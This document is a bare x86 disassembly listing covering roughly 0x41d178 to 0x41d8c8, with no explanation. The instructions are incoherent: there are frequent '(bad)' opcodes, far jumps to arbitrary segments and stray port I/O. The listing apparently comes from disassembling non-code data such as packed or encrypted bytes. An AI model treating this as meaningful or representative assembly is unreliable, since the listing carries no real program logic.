  41d178:	mov    edx,0x612ead74
  41d17d:	and    BYTE PTR [ebp+0x2b22fd02],bl
  41d183:	in     al,dx
  41d184:	jnp    0x41d112
  41d186:	xchg   DWORD PTR [eax],edx
  41d188:	xchg   cl,bh
  41d18a:	(bad)  
  41d18b:	jl     0x41d11d
  41d18d:	lahf   
  41d18e:	add    ebp,DWORD PTR [ecx+0x3a]
  41d191:	dec    DWORD PTR [ecx]
  41d193:	iret   
  41d194:	aaa    
  41d195:	(bad)  
  41d196:	retf   0xde79
  41d199:	sub    ebx,DWORD PTR [edi+0x4]
  41d19c:	pop    esp
  41d19d:	into   
  41d19e:	fistp  QWORD PTR [esi+ebx*8]
  41d1a1:	call   0x63ac:0x8ecf4a7c
  41d1a8:	pop    edi
  41d1a9:	inc    ebx
  41d1aa:	fcomip st,st(5)
  41d1ac:	dec    eax
  41d1ad:	dec    ecx
  41d1ae:	aad    0xb6
  41d1b0:	scas   al,BYTE PTR es:[edi]
  41d1b1:	pop    ss
  41d1b2:	xchg   esi,eax
  41d1b3:	in     eax,dx
  41d1b4:	add    eax,0xf64dcd66
  41d1b9:	xchg   edi,eax
  41d1ba:	nop
  41d1bb:	dec    ecx
  41d1bc:	leave  
  41d1bd:	xor    esp,DWORD PTR [ebx-0x23]
  41d1c0:	jge    0x41d1f1
  41d1c2:	mov    cl,0x7a
  41d1c4:	pcmpgtb mm5,QWORD PTR [esi]
  41d1c7:	pop    edx
  41d1c8:	ss sti 
  41d1ca:	outs   dx,BYTE PTR ds:[esi]
  41d1cb:	mov    ecx,0xb7eae93f
  41d1d0:	inc    esp
  41d1d1:	aad    0xc5
  41d1d3:	(bad)  
  41d1d4:	es inc ecx
  41d1d6:	pop    ebp
  41d1d7:	outs   dx,DWORD PTR ds:[esi]
  41d1d8:	cmc    
  41d1d9:	inc    ebp
  41d1da:	mov    cl,0x45
  41d1dc:	outs   dx,BYTE PTR ds:[esi]
  41d1dd:	jo     0x41d162
  41d1df:	jmp    0x50a94f63
  41d1e4:	pop    es
  41d1e5:	dec    esi
  41d1e6:	lods   eax,DWORD PTR ds:[esi]
  41d1e7:	(bad)  
  41d1e8:	adc    DWORD PTR [eax],ebp
  41d1ea:	cs stc 
  41d1ec:	addr16 inc ecx
  41d1ee:	repz ss adc al,0xc1
  41d1f2:	push   edx
  41d1f3:	pop    ebp
  41d1f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1f5:	gs mov ch,0x7c
  41d1f8:	outs   dx,DWORD PTR ds:[esi]
  41d1f9:	or     BYTE PTR [eax],al
  41d1fb:	stos   DWORD PTR es:[edi],eax
  41d1fc:	cld    
  41d1fd:	push   es
  41d1fe:	lock pop ss
  41d200:	jnp    0x41d235
  41d202:	ja     0x41d213
  41d204:	jle    0x41d193
  41d206:	(bad)  
  41d207:	retf   
  41d208:	or     bh,BYTE PTR ds:0x3731b033
  41d20e:	test   al,0xad
  41d210:	xor    eax,ecx
  41d212:	jge    0x41d250
  41d214:	lea    esi,[ebx]
  41d216:	lahf   
  41d217:	pop    edi
  41d218:	pusha  
  41d219:	stos   DWORD PTR es:[edi],eax
  41d21a:	jmp    0x2cde:0xf9cb00ee
  41d221:	test   al,0x8a
  41d223:	mov    al,0x7d
  41d225:	test   BYTE PTR [ecx],bh
  41d227:	sti    
  41d228:	inc    ebp
  41d229:	cmp    al,0x17
  41d22b:	fstp   TBYTE PTR ss:[ebp+ecx*1+0x43]
  41d230:	into   
  41d231:	or     BYTE PTR [esp+eiz*2],cl
  41d234:	adc    ch,BYTE PTR [edi+ecx*4-0x371e64de]
  41d23b:	and    esi,DWORD PTR [ebx+0x41d7c69a]
  41d241:	add    cl,BYTE PTR [edi+0x48]
  41d244:	push   eax
  41d245:	add    ecx,DWORD PTR [ebx+0x3ddc7222]
  41d24b:	cmc    
  41d24c:	jmp    0x41d1ef
  41d24e:	inc    edx
  41d24f:	mov    ecx,0x3e6b22f0
  41d254:	(bad)  
  41d255:	adc    cl,BYTE PTR [ebx+0x9a106ba]
  41d25b:	loopne 0x41d1f9
  41d25d:	mov    ecx,0xc24c5fe6
  41d262:	loopne 0x41d2d3
  41d264:	mov    ebx,DWORD PTR [eax+0x3]
  41d267:	inc    edi
  41d268:	aam    0x45
  41d26a:	push   cs
  41d26b:	pop    ecx
  41d26c:	add    DWORD PTR [edi+0x2287f971],ebx
  41d272:	cmc    
  41d273:	mov    ebp,0xf38bf0f2
  41d278:	ror    DWORD PTR [ecx+ecx*1-0x21],1
  41d27c:	nop
  41d27d:	sbb    esp,edx
  41d27f:	lock cmp edx,esi
  41d282:	cs leave 
  41d284:	rol    BYTE PTR [edx-0x7ea1d8c0],cl
  41d28a:	adc    dh,dl
  41d28c:	and    dl,dl
  41d28e:	cs ds sbb dl,dh
  41d292:	or     esp,DWORD PTR [edx-0x19326edb]
  41d298:	cmp    bl,BYTE PTR [ebp-0x14d38b5e]
  41d29e:	dec    edx
  41d29f:	adc    bl,dh
  41d2a1:	and    BYTE PTR [ebp-0x2a],cl
  41d2a4:	add    eax,0xc63057eb
  41d2a9:	sbb    eax,0xa5c50652
  41d2ae:	out    0xdf,al
  41d2b0:	inc    edi
  41d2b1:	bound  ecx,QWORD PTR [esi-0x1aba2827]
  41d2b7:	mov    ecx,0xd82a7380
  41d2bc:	xor    eax,0xbdd6796a
  41d2c1:	ss dec eax
  41d2c4:	push   esp
  41d2c5:	cmp    bl,0x2c
  41d2c8:	into   
  41d2c9:	cwde   
  41d2ca:	pop    ecx
  41d2cb:	dec    edx
  41d2cc:	outs   dx,BYTE PTR ds:[esi]
  41d2cd:	pop    edx
  41d2ce:	retf   0xc8b6
  41d2d1:	cmp    al,0x73
  41d2d4:	ja     0x41d34d
  41d2d6:	or     cl,BYTE PTR [ebx+0x60]
  41d2d9:	lods   eax,DWORD PTR ds:[esi]
  41d2da:	into   
  41d2db:	xor    bh,BYTE PTR ds:0x5ffe2e12
  41d2e1:	clc    
  41d2e2:	cli    
  41d2e3:	fild   WORD PTR [eax-0x41f13e2]
  41d2e9:	jbe    0x41d351
  41d2eb:	mov    ecx,0x961ee19b
  41d2f0:	rcr    DWORD PTR [edi+ebx*8+0x6a],cl
  41d2f4:	push   0x46a7204c
  41d2f9:	cmp    BYTE PTR [ebx],ah
  41d2fb:	retf   
  41d2fc:	sub    eax,0x8ab91a16
  41d301:	fsub   DWORD PTR [ecx]
  41d303:	ficom  WORD PTR [edx-0x72e472e5]
  41d309:	jle    0x41d2c7
  41d30b:	jmp    0x3887:0x10dab80a
  41d312:	cmp    eax,0x9713d96b
  41d317:	mov    al,ds:0x73b9c7
  41d31c:	repnz dec ecx
  41d31e:	mov    eax,ebp
  41d320:	fwait
  41d321:	mov    edi,0xce5a5fed
  41d326:	mov    edx,DWORD PTR [edi+ecx*1]
  41d329:	rcl    DWORD PTR gs:[ebp-0x24],0x83
  41d32e:	xchg   ecx,eax
  41d32f:	cmp    edi,ebp
  41d331:	push   0xba715260
  41d336:	bound  esi,QWORD PTR [ebx]
  41d338:	gs retf 0xd8c4
  41d33c:	pop    ebp
  41d33d:	cwde   
  41d33e:	mov    al,ds:0x68ecbe72
  41d343:	pop    esp
  41d344:	mov    ecx,DWORD PTR [edi+0x59d752ac]
  41d34a:	bound  eax,QWORD PTR [ebp+0xe663eb0]
  41d350:	push   0xd2f64442
  41d355:	mov    ah,0xe1
  41d357:	mov    edi,0xcd762186
  41d35c:	shl    DWORD PTR [ecx],1
  41d35e:	data16 add BYTE PTR [bx+0x2dda],dl
  41d364:	sbb    dh,0xb9
  41d367:	les    ecx,FWORD PTR [eax]
  41d369:	inc    edx
  41d36a:	mov    ebx,0xb1d278fc
  41d36f:	inc    ecx
  41d370:	xchg   ecx,eax
  41d371:	push   0xe3e3b8d9
  41d376:	repz mov bh,0x44
  41d379:	cs cmp ebp,ebx
  41d37c:	cmp    eax,DWORD PTR cs:[ebp+0x77]
  41d380:	xor    BYTE PTR [eax+eax*8-0x44],0xf1
  41d385:	ins    DWORD PTR es:[edi],dx
  41d386:	fcmovne st,st(7)
  41d388:	jmp    0x9bb265e8
  41d38d:	inc    ebp
  41d38e:	pop    eax
  41d38f:	cmp    ch,ah
  41d391:	pop    edx
  41d392:	into   
  41d393:	ret    0xa982
  41d396:	push   esp
  41d397:	push   es
  41d398:	mov    esi,0xfed68abf
  41d39d:	xchg   esp,eax
  41d39e:	(bad)  
  41d39f:	aad    0x7b
  41d3a1:	into   
  41d3a2:	sub    eax,0x33d01de7
  41d3a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3a8:	inc    eax
  41d3a9:	sub    DWORD PTR [eax+ebp*1+0x76445869],ecx
  41d3b0:	mov    ds:0xb714bae3,al
  41d3b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3b6:	and    dl,bl
  41d3b8:	daa    
  41d3b9:	push   esi
  41d3ba:	push   eax
  41d3bb:	pop    ebx
  41d3bc:	fmul   st(0),st
  41d3be:	test   BYTE PTR [edi],al
  41d3c0:	jmp    0x4f12:0xcade4a02
  41d3c7:	sub    DWORD PTR [ecx+ebx*4-0x4c],edx
  41d3cb:	stos   DWORD PTR es:[edi],eax
  41d3cc:	jb     0x41d3f5
  41d3ce:	or     eax,0x50a3cf64
  41d3d3:	pusha  
  41d3d4:	xchg   edi,eax
  41d3d5:	mov    ebx,0x70b62275
  41d3da:	scas   al,BYTE PTR es:[edi]
  41d3db:	jnp    0x41d3af
  41d3dd:	es aas 
  41d3df:	gs pop esi
  41d3e1:	inc    ecx
  41d3e2:	jb     0x41d43b
  41d3e4:	lods   al,BYTE PTR ds:[esi]
  41d3e5:	inc    esi
  41d3e6:	(bad)  
  41d3e7:	out    0xfe,eax
  41d3e9:	push   0xfffffff2
  41d3eb:	jle    0x41d404
  41d3ed:	in     al,dx
  41d3ee:	inc    esp
  41d3ef:	sbb    al,0x93
  41d3f1:	cdq    
  41d3f2:	push   ds
  41d3f3:	add    dl,BYTE PTR [ebp+0x2d]
  41d3f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3f7:	int    0x18
  41d3f9:	int    0xd3
  41d3fb:	clc    
  41d3fc:	mov    ebx,fs
  41d3fe:	lahf   
  41d3ff:	sub    DWORD PTR [ecx-0x1f],edi
  41d402:	inc    eax
  41d403:	adc    DWORD PTR ds:[eax+0x43d31987],ecx
  41d40a:	jne    0x41d3de
  41d40c:	sub    ebp,DWORD PTR [edi-0x6a]
  41d40f:	xchg   DWORD PTR [di],esi
  41d412:	popf   
  41d413:	mov    cl,0x46
  41d415:	pop    eax
  41d416:	sbb    eax,0xcd23ff6f
  41d41b:	test   dl,al
  41d41d:	repz ss push edx
  41d420:	add    al,bh
  41d422:	mov    ebp,0x607703d7
  41d427:	and    BYTE PTR [ecx-0x43],dh
  41d42a:	nop
  41d42b:	std    
  41d42c:	lock xlat BYTE PTR ds:[ebx]
  41d42e:	stos   DWORD PTR es:[edi],eax
  41d42f:	imul   eax,DWORD PTR [edi],0xaf7ba21b
  41d435:	fdiv   DWORD PTR [ecx-0x7d]
  41d438:	mov    BYTE PTR [edi+0x45],bl
  41d43b:	(bad)  
  41d43c:	cmp    eax,0xdbd903ff
  41d441:	imul   edx,ebp,0x3f
  41d444:	sbb    dl,BYTE PTR [edi+ebp*2-0x3f]
  41d448:	dec    ebx
  41d449:	push   edx
  41d44a:	loop   0x41d497
  41d44c:	pop    ss
  41d44d:	push   ecx
  41d44e:	mov    dh,0x68
  41d450:	mov    ah,0xcf
  41d452:	xchg   edx,eax
  41d453:	fadd   QWORD PTR [edi+0x75]
  41d456:	retf   0x839c
  41d459:	and    bl,BYTE PTR [edi]
  41d45b:	in     eax,dx
  41d45c:	ret    
  41d45d:	leave  
  41d45e:	popf   
  41d45f:	call   0xc871:0xe8afbb4a
  41d466:	outs   dx,BYTE PTR ds:[esi]
  41d467:	test   BYTE PTR [esi],dl
  41d469:	mov    al,ds:0x91205320
  41d46e:	outs   dx,DWORD PTR ds:[esi]
  41d46f:	fist   DWORD PTR [ebx]
  41d471:	mov    ds:0x64885b73,al
  41d476:	pop    ebx
  41d477:	int3   
  41d478:	dec    ebp
  41d479:	sbb    edx,0x2a
  41d47c:	lds    esp,FWORD PTR [edi]
  41d47e:	addr16 jno 0x41d485
  41d481:	rep stos DWORD PTR es:[edi],eax
  41d483:	retf   
  41d484:	mov    cl,0x6f
  41d486:	add    al,0xb3
  41d488:	(bad)  
  41d489:	mov    eax,0xc273ab3f
  41d48e:	repz popf 
  41d490:	add    BYTE PTR [ebp+0x19],cl
  41d493:	daa    
  41d494:	int3   
  41d495:	sub    bl,al
  41d497:	mov    edx,0x86af2e73
  41d49c:	je     0x41d4eb
  41d49e:	repz cli 
  41d4a0:	sahf   
  41d4a1:	sub    cl,BYTE PTR [edi+0x6e312077]
  41d4a7:	xor    al,0x4b
  41d4a9:	lods   eax,DWORD PTR ds:[esi]
  41d4aa:	mov    dh,0x9b
  41d4ac:	shl    BYTE PTR [edi+0x2c05fedf],0x6d
  41d4b3:	test   eax,0x6f7826a8
  41d4b8:	cmc    
  41d4b9:	jo     0x41d4d7
  41d4bb:	inc    esp
  41d4bc:	mov    dh,0xc6
  41d4be:	adc    dl,BYTE PTR [ebp-0x68]
  41d4c1:	sbb    esi,DWORD PTR ds:0x28eb0865
  41d4c7:	enter  0xc60e,0x46
  41d4cb:	push   esi
  41d4cc:	sub    esi,esp
  41d4ce:	xrelease xchg DWORD PTR [edi],eax
  41d4d1:	shl    BYTE PTR [eax+0x2a9a2865],0xf3
  41d4d8:	adc    al,0x25
  41d4da:	mov    al,ds:0x9813ee4d
  41d4df:	and    ecx,edx
  41d4e1:	mov    bh,0xff
  41d4e3:	cmp    eax,DWORD PTR [ebx+0x78ff831c]
  41d4e9:	or     ebx,eax
  41d4eb:	jnp    0x41d49b
  41d4ed:	push   cs
  41d4ee:	inc    ebx
  41d4ef:	shr    bh,1
  41d4f1:	pop    ds
  41d4f2:	and    ch,BYTE PTR [edi+edx*1+0x2050824f]
  41d4f9:	gs repnz push edx
  41d4fc:	fcmovnbe st,st(1)
  41d4fe:	adc    edi,DWORD PTR [ecx-0x55]
  41d501:	mov    esi,0x8ea1820e
  41d506:	push   ebp
  41d507:	jmp    0x41d55d
  41d509:	test   BYTE PTR [esi+0x62],cl
  41d50c:	stc    
  41d50d:	inc    ecx
  41d50e:	loope  0x41d532
  41d510:	retf   0x50c1
  41d513:	adc    bh,0x86
  41d516:	iret   
  41d517:	test   al,0x42
  41d519:	pop    ds
  41d51a:	pop    ecx
  41d51b:	clc    
  41d51c:	mov    al,ds:0xa81b675
  41d521:	xchg   edx,edi
  41d523:	mov    ah,0xb4
  41d525:	sbb    al,0x40
  41d527:	xor    DWORD PTR [edi],esi
  41d529:	jle    0x41d4af
  41d52b:	and    eax,0x38615cc3
  41d530:	push   esi
  41d531:	hlt    
  41d532:	pop    ss
  41d533:	cmc    
  41d534:	xchg   ecx,eax
  41d535:	sub    DWORD PTR [esi-0x10],edi
  41d538:	outs   dx,BYTE PTR ds:[esi]
  41d539:	inc    eax
  41d53a:	repz jecxz 0x41d501
  41d53d:	(bad)  
  41d53e:	mul    BYTE PTR [ecx+0x1a]
  41d541:	and    BYTE PTR [eax-0x69],0x62
  41d545:	adc    BYTE PTR [edi+0x679248c],dh
  41d54b:	mov    dh,0x22
  41d54d:	imul   eax,DWORD PTR [ecx+0x37],0x226557ed
  41d554:	add    al,BYTE PTR [ebp+0x38]
  41d557:	ins    DWORD PTR es:[edi],dx
  41d558:	pop    esp
  41d559:	adc    ecx,esp
  41d55b:	jge    0x41d5ad
  41d55d:	loop   0x41d523
  41d55f:	nop
  41d560:	cmp    dh,dl
  41d562:	adc    eax,0x1b7b3e25
  41d567:	lds    eax,FWORD PTR [edi]
  41d569:	dec    esi
  41d56a:	repz mov ecx,DWORD PTR [esp+eax*1-0xb]
  41d56f:	and    al,al
  41d571:	add    DWORD PTR [edi-0x4a],edi
  41d574:	fist   WORD PTR [esi+ebp*8]
  41d577:	dec    edx
  41d578:	jne    0x41d53a
  41d57a:	adc    eax,0x759f130b
  41d57f:	dec    ecx
  41d580:	add    ah,ah
  41d582:	retf   0xaed
  41d585:	jge    0x41d568
  41d587:	retf   
  41d588:	adc    BYTE PTR [ebx+ebx*4+0x4b49f4e9],dl
  41d58f:	adc    dl,BYTE PTR [ebx+edi*4-0x7c]
  41d593:	pusha  
  41d594:	(bad)  
  41d596:	pop    ebx
  41d597:	shl    DWORD PTR [edi+0x3c],1
  41d59a:	enter  0xdc3b,0x7
  41d59e:	adc    DWORD PTR [edi],eax
  41d5a0:	imul   ecx,DWORD PTR [ecx+0x3a4628b5],0x9dec5540
  41d5aa:	adc    al,0x7a
  41d5ac:	dec    ecx
  41d5ad:	add    al,0x4f
  41d5af:	jnp    0x41d5b6
  41d5b1:	fadd   st(7),st
  41d5b3:	push   ebx
  41d5b4:	(bad)  
  41d5b5:	rcr    BYTE PTR [esi],1
  41d5b7:	pop    es
  41d5b8:	inc    esp
  41d5b9:	add    eax,0x1f26b70d
  41d5be:	sub    DWORD PTR [edi-0x42566ffb],eax
  41d5c4:	cmp    edx,DWORD PTR [ecx+0x64]
  41d5c7:	dec    esi
  41d5c8:	inc    esp
  41d5c9:	out    dx,eax
  41d5ca:	jne    0x41d5ad
  41d5cc:	sub    eax,0x4377601b
  41d5d1:	cmp    DWORD PTR [eax-0x30],esp
  41d5d4:	mov    ah,BYTE PTR [ebx]
  41d5d6:	ins    DWORD PTR es:[edi],dx
  41d5d7:	dec    edx
  41d5d8:	jae    0x41d63a
  41d5da:	outs   dx,DWORD PTR ds:[esi]
  41d5db:	test   al,0xf9
  41d5dd:	ret    0x4dd5
  41d5e0:	(bad)  
  41d5e1:	aas    
  41d5e2:	inc    ebx
  41d5e3:	add    al,0xfd
  41d5e5:	jno    0x41d658
  41d5e7:	push   eax
  41d5e8:	ret    
  41d5e9:	inc    esi
  41d5ea:	mov    ebx,0x9fadff13
  41d5ef:	adc    al,0x64
  41d5f1:	fucomp st(0)
  41d5f3:	test   bh,bh
  41d5f5:	std    
  41d5f6:	sar    BYTE PTR [ebp+0x14],cl
  41d5f9:	add    bh,ch
  41d5fb:	and    eax,0x69b46cfa
  41d600:	mov    ds:0x22b712b8,eax
  41d605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d606:	push   es
  41d607:	lea    ebx,[ecx-0x6d]
  41d60a:	jne    0x41d625
  41d60c:	aad    0x4c
  41d60e:	dec    edi
  41d60f:	adc    ecx,eax
  41d611:	(bad)  
  41d612:	ja     0x41d5de
  41d614:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d615:	repz jno 0x41d5ac
  41d618:	cdq    
  41d619:	jb     0x41d650
  41d61b:	leave  
  41d61c:	repnz sub dl,BYTE PTR [edi]
  41d61f:	inc    edx
  41d620:	mov    al,ds:0xdb1df9c8
  41d625:	scas   eax,DWORD PTR es:[edi]
  41d626:	cmp    al,0xf7
  41d628:	sahf   
  41d629:	ds pop edx
  41d62b:	enter  0x888c,0x9b
  41d62f:	cs outs dx,BYTE PTR cs:[esi]
  41d632:	mov    dh,0xd0
  41d634:	xchg   edx,eax
  41d635:	or     DWORD PTR [esi+0x51451e38],eax
  41d63b:	mov    eax,ds:0x18cd0de6
  41d640:	pop    esp
  41d641:	dec    ecx
  41d642:	fmul   DWORD PTR ds:0xd875869d
  41d648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d649:	mov    ebp,0xf6a2f5f0
  41d64e:	retf   0x93e4
  41d651:	xor    edi,edx
  41d653:	mov    cl,0x5d
  41d655:	adc    eax,0xe0fdec6b
  41d65a:	add    BYTE PTR [eax],ch
  41d65c:	dec    ecx
  41d65d:	test   ebx,0x6ce8002a
  41d663:	test   DWORD PTR [edi-0x7a037b46],0x1038d43c
  41d66d:	add    ecx,DWORD PTR [ebx-0x2d]
  41d670:	fwait
  41d671:	mov    ds:0xacb4654,eax
  41d676:	rol    DWORD PTR [esi],1
  41d678:	inc    edi
  41d679:	push   eax
  41d67a:	dec    ebp
  41d67b:	clc    
  41d67c:	scas   al,BYTE PTR es:[edi]
  41d67d:	and    cl,BYTE PTR [ecx]
  41d67f:	adc    DWORD PTR [eax],esi
  41d681:	dec    edi
  41d682:	(bad)  
  41d683:	adc    eax,DWORD PTR [eax]
  41d685:	and    dl,dl
  41d687:	cli    
  41d688:	dec    eax
  41d689:	dec    edi
  41d68a:	xchg   ebp,eax
  41d68b:	aad    0x39
  41d68d:	hlt    
  41d68e:	xor    al,0x3c
  41d690:	fcom   st(6)
  41d692:	mov    dh,0x7b
  41d694:	sti    
  41d695:	inc    ecx
  41d696:	inc    edx
  41d697:	mov    DWORD PTR [ecx-0x4e500ede],eax
  41d69d:	or     BYTE PTR [eax+0x5aad5b47],ch
  41d6a3:	jg     0x41d6fb
  41d6a5:	cmp    ch,BYTE PTR [esi]
  41d6a7:	pop    eax
  41d6a8:	lods   al,BYTE PTR ds:[esi]
  41d6a9:	ret    
  41d6aa:	mov    ah,0xbc
  41d6ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6ad:	dec    eax
  41d6ae:	leave  
  41d6af:	shl    DWORD PTR [esi+0x6eb98ce1],cl
  41d6b5:	push   edx
  41d6b6:	mov    eax,0xc082915e
  41d6bb:	mov    bh,0xa5
  41d6bd:	mov    es,WORD PTR [edi+0x3cb75685]
  41d6c3:	jno    0x41d6f2
  41d6c5:	mov    dh,0x9c
  41d6c7:	sbb    al,0xbc
  41d6c9:	out    0x2c,eax
  41d6cb:	pop    edi
  41d6cc:	in     eax,dx
  41d6cd:	mov    dh,0xad
  41d6cf:	mul    edi
  41d6d1:	cmp    bh,BYTE PTR [esi]
  41d6d3:	sbb    eax,DWORD PTR [ecx]
  41d6d5:	int    0xac
  41d6d7:	pop    eax
  41d6d8:	push   ss
  41d6d9:	sub    BYTE PTR [edi+0x53],ch
  41d6dc:	(bad)  
  41d6de:	call   0x30b1:0x5eeac511
  41d6e5:	xchg   BYTE PTR ds:0x2f2b15ad,al
  41d6eb:	push   eax
  41d6ec:	inc    DWORD PTR [edi-0x635912cc]
  41d6f2:	xor    BYTE PTR [ecx+eiz*2+0x41e4403f],cl
  41d6f9:	jmp    0x492d:0x95f4f7c3
  41d700:	stc    
  41d701:	add    dl,BYTE PTR [ebx]
  41d703:	(bad)  
  41d704:	int    0xb0
  41d706:	xor    DWORD PTR [eax+0x62f3ef0b],ecx
  41d70c:	ret    0x739d
  41d70f:	push   edx
  41d710:	push   0x14
  41d712:	sub    BYTE PTR [edx+0x62],cl
  41d715:	dec    edi
  41d716:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d717:	sbb    dl,BYTE PTR [eax-0x85c4286]
  41d71d:	add    ecx,edx
  41d71f:	jle    0x41d70d
  41d721:	(bad)  
  41d723:	cmp    al,0xe
  41d725:	lods   al,BYTE PTR ds:[esi]
  41d726:	push   0x253dc721
  41d72b:	popa   
  41d72c:	jecxz  0x41d72c
  41d72e:	into   
  41d72f:	mov    esp,0x19519191
  41d734:	repnz lds ebx,FWORD PTR [ebp-0x46]
  41d738:	fmul   QWORD PTR [ebp-0x4]
  41d73b:	mov    esp,0xb7d3661d
  41d740:	and    cl,BYTE PTR [eax+eax*2-0x5b]
  41d744:	xor    BYTE PTR [esi],dh
  41d746:	add    al,0x5e
  41d748:	ss icebp 
  41d74a:	fild   WORD PTR [edi+0x4232bf55]
  41d750:	adc    cl,BYTE PTR [ebp+esi*4-0x3]
  41d754:	add    BYTE PTR ds:0x92b7c66b,ch
  41d75a:	out    dx,eax
  41d75b:	mov    ch,0x89
  41d75d:	popf   
  41d75e:	pop    eax
  41d75f:	mov    al,0xda
  41d761:	push   esi
  41d762:	cmp    eax,0x78d61a66
  41d767:	xchg   edx,eax
  41d768:	jne    0x41d790
  41d76a:	pop    es
  41d76b:	out    dx,al
  41d76c:	mov    edi,DWORD PTR [esi-0x3afbfb20]
  41d772:	sub    bh,bh
  41d774:	inc    ebp
  41d775:	jns    0x41d7c9
  41d777:	scas   al,BYTE PTR es:[edi]
  41d778:	xor    ebp,esi
  41d77a:	jae    0x41d797
  41d77c:	jecxz  0x41d77e
  41d77e:	scas   al,BYTE PTR es:[edi]
  41d77f:	out    0x7,al
  41d781:	sub    esi,DWORD PTR [edi]
  41d783:	cmc    
  41d784:	inc    edi
  41d785:	cmc    
  41d786:	push   edx
  41d787:	dec    ebx
  41d788:	lods   al,BYTE PTR ds:[esi]
  41d789:	cmp    bl,BYTE PTR [ecx+0x68]
  41d78c:	retf   
  41d78d:	mov    ecx,DWORD PTR [edx]
  41d78f:	pusha  
  41d790:	ins    BYTE PTR es:[edi],dx
  41d791:	dec    eax
  41d792:	je     0x41d7bf
  41d794:	aaa    
  41d795:	in     al,dx
  41d796:	aam    0xd0
  41d798:	fs cli 
  41d79a:	adc    DWORD PTR [ecx],edx
  41d79c:	push   esi
  41d79d:	pop    eax
  41d79e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d79f:	sbb    al,0xf4
  41d7a1:	ins    DWORD PTR es:[edi],dx
  41d7a2:	pop    ecx
  41d7a3:	call   0xff54:0x4fea3724
  41d7aa:	test   ecx,edx
  41d7ac:	dec    ebp
  41d7ad:	fsub   QWORD PTR [esi+ecx*8+0x5738cdf0]
  41d7b4:	xchg   ebp,eax
  41d7b5:	ss dec di
  41d7b8:	gs pop esp
  41d7ba:	cmp    eax,0x11515034
  41d7bf:	inc    ebx
  41d7c0:	sub    esi,DWORD PTR [ebp-0x1d2c8776]
  41d7c6:	mov    ah,0x11
  41d7c8:	dec    ebp
  41d7c9:	aaa    
  41d7ca:	js     0x41d79d
  41d7cc:	inc    ebp
  41d7cd:	pop    esi
  41d7ce:	test   eax,0x6d024a62
  41d7d3:	xchg   esi,esp
  41d7d5:	or     BYTE PTR [esi],bh
  41d7d7:	inc    ebx
  41d7d8:	inc    esi
  41d7d9:	call   0x2b68:0xe4ccf1b6
  41d7e0:	sahf   
  41d7e1:	pop    ss
  41d7e2:	loopne 0x41d779
  41d7e4:	and    DWORD PTR [edi-0x22],eax
  41d7e7:	daa    
  41d7e8:	call   FWORD PTR [ebx+0x57]
  41d7eb:	hlt    
  41d7ec:	jbe    0x41d814
  41d7ee:	test   al,0x73
  41d7f0:	cmp    esp,DWORD PTR [ebx-0x18f954f3]
  41d7f6:	adc    dl,BYTE PTR [edx+0x6d]
  41d7f9:	rcl    BYTE PTR [ebp+0x7e813fb8],1
  41d7ff:	jae    0x41d7c4
  41d801:	pop    ecx
  41d802:	std    
  41d803:	mov    ebp,0xafe01e57
  41d808:	mov    ebp,0x414f8d4d
  41d80d:	sahf   
  41d80e:	fadd   DWORD PTR [esp+edi*1+0x10]
  41d812:	sub    ah,bh
  41d814:	rol    DWORD PTR [ebx-0x2310c66c],1
  41d81a:	popf   
  41d81b:	imul   edi,DWORD PTR [esi+0x3f],0xdee8405c
  41d822:	fsubr  DWORD PTR [ebx-0x7c]
  41d825:	jae    0x41d80a
  41d827:	test   DWORD PTR [ebp+0x5f5fc17d],edx
  41d82d:	inc    edx
  41d82e:	aad    0x5
  41d830:	adc    dh,BYTE PTR [esi+0x71285bcb]
  41d836:	cmp    DWORD PTR [eax+ebp*8-0x27],0xffffffb2
  41d83b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d83c:	mov    eax,0xdb8a8b08
  41d841:	and    BYTE PTR [ebp-0x7d],bh
  41d844:	cmp    ebx,DWORD PTR [edx+0x1c]
  41d847:	pusha  
  41d848:	xlat   BYTE PTR ds:[ebx]
  41d849:	ins    DWORD PTR es:[edi],dx
  41d84a:	push   eax
  41d84b:	dec    edx
  41d84c:	je     0x41d8a8
  41d84e:	push   edx
  41d84f:	jmp    0x19a8f6fa
  41d854:	add    BYTE PTR [ebp+0x58],dh
  41d857:	test   eax,0xa3bc9218
  41d85c:	and    eax,0xfa3e41cb
  41d861:	sub    DWORD PTR [edx-0x63],esp
  41d864:	add    DWORD PTR [edi],0x3da5ba91
  41d86a:	pop    ecx
  41d86b:	mul    DWORD PTR [ecx-0x67cad868]
  41d871:	xchg   esp,eax
  41d872:	xchg   edi,eax
  41d873:	jo     0x41d86c
  41d875:	sbb    al,0x37
  41d877:	sahf   
  41d878:	stos   DWORD PTR es:[edi],eax
  41d879:	xchg   ebx,eax
  41d87a:	pop    ebp
  41d87b:	(bad)
  41d87f:	outs   dx,BYTE PTR ds:[esi]
  41d880:	push   ebx
  41d881:	add    BYTE PTR [edi+esi*1-0xe3944fd],dl
  41d888:	cld    
  41d889:	push   esi
  41d88a:	das    
  41d88b:	fs xor eax,0x10fcbd1a
  41d891:	sub    BYTE PTR [edi-0x43],dh
  41d894:	std    
  41d895:	dec    ebp
  41d896:	sub    eax,0x87d897eb
  41d89b:	scas   eax,DWORD PTR es:[edi]
  41d89c:	test   DWORD PTR [edx+ebx*8-0x118db782],ebp
  41d8a3:	sbb    eax,0x9bde8d26
  41d8a8:	or     BYTE PTR [ecx+0x266bf21b],ah
  41d8ae:	xchg   ebp,eax
  41d8af:	lods   eax,DWORD PTR ds:[esi]
  41d8b0:	loope  0x41d8c7
  41d8b2:	es pusha 
  41d8b4:	cmp    DWORD PTR [esi],ebp
  41d8b6:	and    ah,BYTE PTR [edx+0x46]
  41d8b9:	test   al,0xb2
  41d8bb:	dec    ecx
  41d8bc:	das    
  41d8bd:	mov    DWORD PTR [ebx+0x38e24335],ebx
  41d8c3:	mov    ebx,0x20ca00df
  41d8c8:	daa    
